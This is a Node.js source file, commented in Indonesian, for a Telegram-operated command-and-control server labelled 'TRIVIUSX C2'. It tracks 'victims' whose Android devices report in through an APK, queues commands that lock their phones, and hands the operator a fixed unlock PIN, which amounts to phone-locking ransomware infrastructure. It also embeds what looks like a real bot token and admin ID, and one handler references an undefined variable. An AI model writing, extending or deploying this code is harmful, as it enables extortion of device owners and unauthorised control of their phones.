const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');

// === GANTI DISINI ===
const TOKEN = '7544547088:AAFAeOsnG_Fq7Yqmthaf9Hbv9osft2aT77k';
const ADMIN_ID = '7372650318'; 

const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();
app.use(bodyParser.json());

let deviceQueue = {}; 
let victimData = {};

// --- PERINTAH TELEGRAM ---
bot.onText(/\/start/, (msg) => {
    if (msg.chat.id.toString() !== ADMIN_ID) return;
    bot.sendMessage(ADMIN_ID, "🛡️ **TRIVIUSX C2 ONLINE**\n\n/list - Lihat Korban\n/lock [ID] - Kunci HP\n/unlock [ID] - Ambil PIN\n/data [ID] - Info HP");
});

bot.onText(/\/list/, (msg) => {
    let targets = Object.keys(victimData);
    bot.sendMessage(ADMIN_ID, `📊 **TARGET:**\n${targets.join('\n') || 'Kosong'}`);
});

bot.onText(/\/lock (.+)/, (msg, match) => {
    deviceQueue[match[1]] = "LOCK";
    bot.sendMessage(adminId, `🔒 LOCK dikirim ke ${match[1]}`);
});

bot.onText(/\/unlock (.+)/, (msg, match) => {
    bot.sendMessage(ADMIN_ID, `🔑 PIN UNLOCK: **4045**`);
});

// --- API UNTUK APK ---
app.post('/api/sync', (req, res) => {
    const { deviceId, model, androidVer } = req.body;
    victimData[deviceId] = `Model: ${model}\nAndroid: ${androidVer}`;
    
    const cmd = deviceQueue[deviceId] || "IDLE";
    deviceQueue[deviceId] = "IDLE"; 
    res.json({ cmd: cmd });
});

// Port otomatis untuk Railway
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server aktif di port ${PORT}`);
});

